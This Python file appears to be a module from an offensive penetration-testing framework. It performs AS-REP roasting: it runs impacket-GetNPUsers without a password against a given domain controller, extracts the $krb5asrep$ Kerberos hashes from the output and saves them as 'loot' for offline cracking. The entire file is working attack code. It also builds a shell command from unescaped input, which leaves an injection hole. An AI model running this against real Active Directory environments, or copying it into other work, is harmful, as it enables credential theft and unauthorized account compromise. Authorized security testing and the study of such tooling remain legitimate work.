PROVIDES = ["asrep_hashes"]
REQUIRES = ["usernames"]


def run(data, cred, args):
    import subprocess
    from core.loot import get_loot_path, require_input

    domain = data.get("domain")
    ip = data.get("ip")

    if not domain or not ip:
        print("[!] Target missing domain or IP")
        return

    # ---------------- INPUT (CLI OR LOOT) ----------------
    user_file = require_input(data, args, "users", "usernames", "user list")
    if not user_file:
        return

    # ---------------- OUTPUT (TO LOOT) ----------------
    output_file = get_loot_path(data, "asrep_hashes")

    # ---------------- BUILD COMMAND ----------------
    cmd = f"impacket-GetNPUsers {domain}/ -no-pass -usersfile {user_file} -dc-ip {ip}"

    print(f"[*] Running: {cmd}\n")

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    # optional: show tool output
    print(result.stdout)
    if result.stderr:
        print(result.stderr)

    # ---------------- PARSE HASHES ----------------
    hashes = []

    for line in result.stdout.splitlines():
        if line.startswith("$krb5asrep$"):
            hashes.append(line.strip())

    if not hashes:
        print("[!] No AS-REP roastable users found")
        return

    # ---------------- SAVE ----------------
    output_file.write_text("\n".join(hashes))

    print(f"\n[+] Saved {len(hashes)} hashes → {output_file}")